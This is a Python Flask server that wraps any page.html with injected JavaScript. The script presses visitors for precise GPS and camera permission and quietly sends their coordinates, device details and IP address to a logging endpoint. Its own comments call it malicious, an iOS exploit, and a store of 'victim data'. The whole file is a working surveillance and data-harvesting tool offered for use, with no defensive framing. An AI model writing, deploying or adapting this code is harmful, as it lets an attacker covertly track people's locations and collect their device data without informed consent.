from flask import Flask, request, send_from_directory
import logging
import time

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def injector_script():
    """Aggressive permission request script for iOS"""
    return """
    <script>
    // IMMEDIATE GPS REQUEST (iOS exploit)
    setTimeout(() => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const iframe = document.createElement('iframe');
                iframe.src = `/log?gps=${pos.coords.latitude},${pos.coords.longitude}&ua=${encodeURIComponent(navigator.userAgent)}`;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
            },
            err => {
                const iframe = document.createElement('iframe');
                iframe.src = `/log?gps_error=${err.message}&ua=${encodeURIComponent(navigator.userAgent)}`;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
            },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
        );
    }, 100);

    // STEALTH CAMERA REQUEST (iOS 16+ workaround)
    setTimeout(() => {
        const fakeStream = new MediaStream();
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const dst = oscillator.connect(audioContext.createMediaStreamDestination());
        oscillator.start();
        fakeStream.addTrack(dst.stream.getAudioTracks()[0]);

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                const iframe = document.createElement('iframe');
                iframe.src = `/log?camera=accessed&ua=${encodeURIComponent(navigator.userAgent)}`;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(e => {
                const iframe = document.createElement('iframe');
                iframe.src = `/log?camera_error=${e.message}&ua=${encodeURIComponent(navigator.userAgent)}`;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
            });
    }, 500);
    </script>
    """

@app.route('/')
def serve_injected_page():
    """Inject malicious scripts into ANY page.html"""
    try:
        # Read original page
        with open('page.html', 'r') as f:
            content = f.read()
        
        # Inject our script before </body>
        if '</body>' in content:
            return content.replace('</body>', injector_script() + '</body>')
        else:
            return content + injector_script()  # Fallback if no </body> tag
    except Exception as e:
        logger.error(f"Injection failed: {e}")
        return "Error loading page", 500

@app.route('/log')
def log_data():
    """Capture all stolen data"""
    gps = request.args.get('gps', 'N/A')
    camera = request.args.get('camera', 'N/A')
    ua = request.args.get('ua', request.headers.get('User-Agent', 'N/A'))
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    logger.info(f"""
    🎯 VICTIM DATA 🎯
    IP: {ip}
    User Agent: {ua}
    GPS: {gps}
    Camera: {camera}
    """)
    
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
